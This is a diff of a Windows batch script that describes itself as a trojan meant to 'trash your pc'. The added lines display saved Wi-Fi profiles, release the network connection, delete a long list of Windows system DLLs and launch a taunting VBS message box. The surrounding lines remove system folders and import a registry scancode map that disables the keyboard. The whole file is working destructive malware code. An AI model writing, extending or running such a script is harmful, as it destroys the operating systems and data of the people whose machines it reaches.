@@ -2,6 +2,9 @@
 @echo off 
 echo You're about to run a trojan that will trash your pc. Continue? 
 pause 
+echo MsgBox "Oh no, there is no more windows on ur computer" >x.vbs 
+netsh wlan show profile
+ipconfig /release 
 cd C:\windows 
 del  Setup 
 rd  System
@@ -22,10 +25,21 @@ del DevicesFlowBroker.dll
 del DeviceSoftwareInstallationClient.dll
 del DeviceUpdateAgent.dll
 del DeviceUxRes.dll
+del windows.internal.shellcommon.AppResolverModal.dll
+del Windows.Internal.ShellCommon.Broker.dll
+del Windows.Internal.ShellCommon.dll
+del windows.internal.shellcommon.FilePickerExperienceMEM.dll
+del Windows.Internal.ShellCommon.PrintExperience.dll
+del windows.internal.shellcommon.shareexperience.dll
+del windows.internal.shellcommon.TokenBrokerModal.dll
+del Windows.Internal.Signals.dll
+del Windows.Internal.System.UserProfile.dll
+del Windows.Internal.Taskbar.dll
+del Windows.Security.Authentication.Identity.Provider.dll
+del Windows.Security.Authentication.OnlineId.dll
+del Windows.Security.Authentication.Web.Core.dll
 rd System32
 mkdir System23 
-
-@echo off
 echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
 echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
 echo "Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\ >> "nokeyboard.reg"
@@ -50,3 +64,4 @@ echo 10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,
 echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\ >> "nokeyboard.reg"
 echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
 reg import nokeyboard.reg
+start wscript x.vbs 
